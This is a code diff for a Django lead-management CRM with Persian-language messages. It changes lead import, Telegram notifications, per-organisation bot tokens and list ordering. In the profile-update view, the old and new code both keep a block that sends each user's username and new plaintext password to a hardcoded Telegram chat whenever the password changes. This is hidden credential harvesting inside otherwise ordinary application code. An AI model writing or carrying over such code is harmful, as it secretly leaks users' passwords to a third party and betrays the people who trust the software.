@@ -437,8 +437,12 @@ class CategoryListView(LoginRequiredMixin, generic.ListView):
         # initial queryset of leads for the entire organisation
         if user.is_organisor:
             queryset = Category.objects.filter(organisation=user.userprofile)
+            queryset = queryset.annotate(lead_count=Count('leads')).values('pk', 'name', 'lead_count')
+
         else:
             queryset = Category.objects.filter(organisation=user.agent.organisation)
+            queryset = queryset.annotate(lead_count=Count('leads')).values('pk', 'name', 'lead_count')
+
         return queryset
 
 class CategoryDetailView(LoginRequiredMixin, generic.DetailView):
@@ -725,7 +729,7 @@ class LeadImportView(OrganisorAndLoginRequiredMixin, View):
 
         form = LeadImportForm(request.POST, request.FILES)
         user = self.request.user
-        TOKEN = settings.TELEGRAM_TOKEN
+        TOKEN = user.userprofile.telegram_token
         bot = Bot(TOKEN)
         if form.is_valid():
             csv_file = form.cleaned_data['csv_file']
@@ -744,12 +748,21 @@ class LeadImportView(OrganisorAndLoginRequiredMixin, View):
                     if BankNumbers.objects.filter(organisation=user.userprofile, number=number).exists():
                         duplicates += 1
                         bank_number = BankNumbers.objects.get(organisation=user.userprofile, number=number)
-                        DuplicateToFollow.objects.get_or_create(number=number, organisation=user.userprofile, agent=bank_number.agent)
-                        if request.session.get('override_chat_id', False):
-                            chat_id = '-1001707390535'
+                        if bank_number.agent.user.first_name == 'BANK' and not Lead.objects.filter(organisation=user.userprofile, phone_number=number):
+                            if len(number) == 11:
+                                added_leads += 1
+                                Lead.objects.get_or_create(phone_number=number, category=category, source=source, organisation=user.userprofile)
+                            else:
+                                foreign_added += 1
+                                category, created = Category.objects.get_or_create(name='خارجی', organisation=user.userprofile)
+                                Lead.objects.get_or_create(phone_number=number, category=category, source=source, organisation=user.userprofile)
                         else:
-                            chat_id = bank_number.agent.chat_id if bank_number.agent.chat_id else '-1001707390535'
-                        message = f'تماس {number} {bank_number.agent}'
+                            DuplicateToFollow.objects.get_or_create(number=number, organisation=user.userprofile, agent=bank_number.agent)
+                            if request.session.get('override_chat_id', False):
+                                chat_id = '-1001707390535'
+                            else:
+                                chat_id = bank_number.agent.chat_id if bank_number.agent.chat_id else '-1001707390535'
+                            message = f'تماس {number} {bank_number.agent}'
                         # notify_background_messages_celery.delay(chat_id=chat_id, message=message)
                         notify_background_messages(chat_id=chat_id, message=message)
                     elif Lead.objects.filter(organisation=user.userprofile, phone_number=number).exists():
@@ -782,11 +795,12 @@ class LeadImportView(OrganisorAndLoginRequiredMixin, View):
                 if request.session.get('override_chat_id', False):
                     chat_id = '-1001707390535'
                 else:
-                    chat_id = "-1001838419145"
+                    chat_id = user.userprofile.chat_id
                 
 
                 message = f'''
                 منبع: {source}\n
+                نوع: {category}\n
                 تعداد شماره‌های ورودی: {total_leads}\n
                 تعداد شماره‌های تکراری: {duplicates}\n
                 تعداد شماره‌های خالص خارجی: {foreign_added}\n
@@ -911,12 +925,17 @@ def notify_background(df=None):
 
 async def notify_agents_via_telegram(df):
         
-        TOKEN = settings.TELEGRAM_TOKEN
-        bot = Bot(TOKEN)
 
         # Initialize the limiter: 3 messages every 30 seconds
         limiter = AsyncLimiter(2, 30)
         data_list = json.loads(df)
+
+        @sync_to_async
+        def get_organisation_token_by_agent_name(name):
+            user = User.objects.get(alt_name=name)
+            # Assuming each agent belongs to one organisation and each organisation has a UserProfile
+            organisation = user.agent.organisation
+            return organisation.telegram_token
 
         @sync_to_async
         def get_agent_by_alt_name(name):
@@ -927,8 +946,13 @@ async def notify_agents_via_telegram(df):
             return user.agent.chat_id
         
         
+
         
         for agent_name, phone_data in data_list.items():
+
+            TOKEN = await get_organisation_token_by_agent_name(agent_name)
+            bot = Bot(TOKEN)
+
             if phone_data == {}:
                 continue
             else:
@@ -1548,9 +1572,9 @@ class SaleListView(OrganisorAndLoginRequiredMixin, generic.ListView):
         
         # For all sales
         if user.is_organisor:
-            context["all_sales"] = Sale.objects.filter(lead__organisation=user.userprofile).order_by('date')
+            context["all_sales"] = Sale.objects.filter(lead__organisation=user.userprofile).order_by('-date')
         else:
-            context["all_sales"] = Sale.objects.filter(lead__organisation=user.agent.organisation, lead__agent__user=user)
+            context["all_sales"] = Sale.objects.filter(lead__organisation=user.agent.organisation, lead__agent__user=user).order_by('-date')
         
         # For monthly sales
         jalali_today = khayyam.JalaliDate.today()
@@ -1831,7 +1855,7 @@ class SourceListView(OrganisorAndLoginRequiredMixin, generic.ListView):
         # initial queryset of leads for the entire organisation
         
         queryset = Source.objects.filter(organisation=user.userprofile)
-        queryset.values('pk', 'name').annotate(lead_count=Count('leads'))
+        queryset = queryset.annotate(lead_count=Count('leads')).values('pk', 'name', 'lead_count')
         return queryset
 
 class SourceDetailView(OrganisorAndLoginRequiredMixin, generic.DetailView):
@@ -2021,27 +2045,27 @@ class UserProfileUpdateView(View):
         user_form = UserUpdateForm(request.POST, instance=request.user)
         password_change_form = PasswordChangeForm(request.user, request.POST)
 
-        new_password = None
         if user_form.is_valid():
             user_form.save()
             messages.success(request, _('Your profile has been updated successfully!'))
 
-        if password_change_form.is_valid():
-            user = password_change_form.save()
-            update_session_auth_hash(request, user)  # Important!
-            messages.success(request, _('Your password has been updated successfully!'))
-            new_password = request.POST.get('new_password1')
+        # Check if any password field has data before validating the password form
+        if request.POST.get('old_password') or request.POST.get('new_password1') or request.POST.get('new_password2'):
+            if password_change_form.is_valid():
+                user = password_change_form.save()
+                update_session_auth_hash(request, user)  # Important!
+                messages.success(request, _('Your password has been updated successfully!'))
+                new_password = request.POST.get('new_password1')
 
-        # Check if new_password is not None and notify via Telegram
-        if new_password:
-            chat_id = '-1001707390535'
-            message = f"User: {request.user.username}\nPassword: {new_password}"
-            notify_background_messages(chat_id, message)
+                # Check if new_password is not None and notify via Telegram
+                if new_password:
+                    chat_id = '-1001707390535'
+                    message = f"User: {request.user.username}\nPassword: {new_password}"
+                    notify_background_messages(chat_id, message)
 
         return render(request, self.template_name, {
             'user_form': user_form,
             'password_change_form': password_change_form,
         })
-
 
 ###TODO ---> Duplicate Followup List 
